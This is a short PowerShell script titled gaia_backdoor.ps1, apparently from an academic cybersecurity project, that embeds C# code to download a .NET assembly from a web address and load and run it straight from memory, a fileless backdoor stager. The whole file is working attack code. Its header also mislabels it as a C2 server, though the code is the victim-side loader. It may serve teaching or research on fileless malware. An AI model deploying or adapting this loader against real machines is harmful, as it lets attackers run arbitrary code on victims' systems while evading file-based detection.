# =============================================================================
# Project Name: FilelessGaia
# File: gaia_backdoor.ps1
# Description: C2 Server for the Orion Project
#
# Copyright (c) 2026 Christophe SUBLET, Grenoble INP - Esisar, UGA, CyberSkills@UGA
#
# This file is part of FilelessGaia
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# =============================================================================

$code = @"
using System;
using System.IO;
using System.Net;
using System.Reflection;

public class ModuleExecutor
{
    public static void ExecuteModule()
    {
        try
        {
            string url = "http://localhost:8080/gadfTs55sghsSSS/phppost.php?id=TestMachine";
            byte[] bytes = DownloadModule(url);
            
            if (bytes != null && bytes.Length > 100)
            {
                Assembly assembly = Assembly.Load(bytes);
                Type moduleType = assembly.GetType("Module");
                MethodInfo method = moduleType.GetMethod("Run");
                method.Invoke(null, null);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Execution error: " + ex.Message);
        }
    }

    private static byte[] DownloadModule(string url)
    {
        using (WebClient client = new WebClient())
        {
            try
            {
                return client.DownloadData(url);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Download error: " + ex.Message);
                return null;
            }
        }
    }
}
"@

Add-Type -TypeDefinition $code
[ModuleExecutor]::ExecuteModule()